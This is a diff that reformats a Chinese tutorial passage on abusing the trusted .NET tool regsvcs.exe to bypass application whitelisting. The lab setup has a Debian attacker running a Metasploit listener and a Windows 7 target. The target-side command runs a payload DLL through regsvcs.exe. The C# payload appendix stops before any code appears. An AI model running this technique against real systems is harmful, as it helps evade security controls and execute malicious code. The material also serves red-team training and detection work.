@@ -1,35 +1,37 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
+  
+  
+### Regsvcs简介：
 
-**Regsvcs简介：**
-
-Regsvcs为.NET服务安装工具，主要提供三类服务：
-* 加载并注册程序集。
-* 生成、注册类型库并将其安装到指定的 COM+ 1.0 应用程序中。
-* 配置以编程方式添加到类的服务。
+Regsvcs为.NET服务安装工具，主要提供三类服务：  
+* 加载并注册程序集。  
+* 生成、注册类型库并将其安装到指定的 COM+ 1.0 应用程序中。  
+* 配置以编程方式添加到类的服务。  
 
 **说明：**Regsvcs.exe所在路径没有被系统添加PATH环境变量中，因此，Regsvcs命令无法识别。
 
-具体参考微软官方文档：
+具体参考微软官方文档：  
 https://docs.microsoft.com/en-us/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool
 
 基于白名单Regsvcs.exe配置payload：
 
 Windows 7 默认位置：
-`C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe`
+```bash
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe
+```
 
-**攻击机：**192.168.1.4 Debian
-
+**攻击机：**192.168.1.4 Debian  
 **靶机：**192.168.1.3 Windows 7
 
-**配置攻击机msf：**
+### 配置攻击机msf：
 ![](media/f80a8df6945621d36a5dd72bf623281a.jpg)
 
-**靶机执行：**
-`C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Micropoor.dll`
+### 靶机执行：
+```bash
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Micropoor.dll
+```
 ![](media/5a929f376966814377cd69342c7f8f17.jpg)
 
-## 附录：Micropoor.cs
+### 附录：Micropoor.cs
 **注：x86 payload**
 
 ```c#
